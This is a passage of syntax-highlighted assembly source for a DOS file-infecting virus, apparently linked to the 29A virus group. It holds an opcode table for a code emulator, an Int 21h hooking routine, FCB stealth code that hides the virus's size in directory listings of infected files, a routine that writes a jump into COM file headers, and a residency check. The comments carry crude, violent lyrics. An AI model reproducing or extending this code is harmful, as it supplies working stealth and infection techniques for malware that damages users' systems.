    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@wrongkind</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@RetfNum</span><span class="sc4">,</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@RetfKind</span><span class="sc0">    </span><span class="sc1">; c9h-cbh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@interrupt</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">      </span><span class="sc1">; cch-ceh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@IretKind</span><span class="sc0">                                            </span><span class="sc1">; cfh</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc0">   </span><span class="sc1">; d0h-d2h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc0">      </span><span class="sc1">; d3h-d5h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@wrongkind</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc0">   </span><span class="sc1">; d6h-d8h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc0">   </span><span class="sc1">; d9h-dbh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc0">   </span><span class="sc1">; dch-deh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable1</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@MLoopnz</span><span class="sc4">,</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@MLoopz</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@MLoop</span><span class="sc0">       </span><span class="sc1">; e0h-e2h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@MJcxz</span><span class="sc4">,</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc0">      </span><span class="sc1">; e3h-e5h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes2</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@SCall</span><span class="sc0">       </span><span class="sc1">; e6h-e8h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Sjmp</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Fjmp</span><span class="sc4">,</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@NJmp</span><span class="sc0">        </span><span class="sc1">; e9h-ebh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">      </span><span class="sc1">; ech-eeh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">                                              </span><span class="sc1">; efh</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@wrongkind</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@NotCsPrefix</span><span class="sc1">; f0h-f2h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@NotCsPrefix</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">      </span><span class="sc1">; f3h-f5h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@variable2</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Variable3</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">      </span><span class="sc1">; f6h-f8h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc0">      </span><span class="sc1">; f9h-fbh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@bytes1</span><span class="sc4">,</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@0FEh</span><span class="sc0">        </span><span class="sc1">; fch-feh</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@0FFh</span><span class="sc0">



        </span><span class="sc1">; **********************</span><span class="sc0">
        </span><span class="sc1">; Opcodes for emulation</span><span class="sc0">
        </span><span class="sc1">; **********************</span><span class="sc0">

</span><span class="sc5">_csflag</span><span class="sc4">:</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ds2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_Pref</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ip</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_cs</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ds</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_es</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ax</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_bx</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_cx</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_dx</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_si</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_di</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_bp</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_flags</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ss</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_sp</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ss2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_sp2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_stack</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">350d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_endstack</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">_stack2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">300d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_endstack2</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">_usemode</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_theresacall</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">





</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                           Diverse subroutines</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">


</span><span class="sc5">check_dos_version</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7d</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_sft</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">@@go_out</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1216h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">             </span><span class="sc1">; In ES:DI we get the Sft entry that</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc5">@@go_out</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;belongs to the actual file.</span><span class="sc0">



</span><span class="sc5">rehandle</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">jump_handle</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Place to handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">jump_handle</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0eah</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21handler</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;                              FCB Stealth</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; He is the angel with the scabbed wings hard-drug face want to powder his</span><span class="sc0">
</span><span class="sc1">;nose. He will deflower the freshest crop dry up all the wombs with his</span><span class="sc0">
</span><span class="sc1">;rock and roll sores.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">fcb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; The same old routine</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Int21h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;for Fcb stealth ( nothing</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">;new, aren't you bored</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">nada_de_stealth</span><span class="sc0">         </span><span class="sc1">;about this ones ? )</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all_regs</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Not_infected</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Normal_FCB</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">

</span><span class="sc5">Normal_FCB</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Not_infected</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc5">Virus_size</span><span class="sc4">+</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">06bh</span><span class="sc0">

</span><span class="sc5">Not_infected</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">

</span><span class="sc5">nada_de_stealth</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">InVirus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21h_plural</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">w95whit</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rehandle</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_old</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stack_old</span><span class="sc0">

</span><span class="sc5">w95whit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">


</span><span class="sc5">set_a_pair_values</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_theresacall</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; Dos=HMA ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_usemode</span><span class="sc4">],</span><span class="sc2">0201h</span><span class="sc0">    </span><span class="sc1">;OPTIMIZE !!!</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Code_Emulator</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">fuck_the_rules</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ss</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Set stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_endstack</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Strapping_Young_Lad</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; First 3 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">comjmp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Smack_My_Bitch_UP</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ff00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">BP_Init</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; Delta adjust</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Another_BP</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;                              Int 21h handler</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  And I control you, guy. Total control. Sickness. Cold. Do you want to die</span><span class="sc0">
</span><span class="sc1">; with me today ?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">InVirus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">int21handler</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">InVirus</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0cacah</span><span class="sc0">       </span><span class="sc1">; Tsr check</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@Fale_ok</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc12">'_29A'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@Fale_ok</span><span class="sc0">

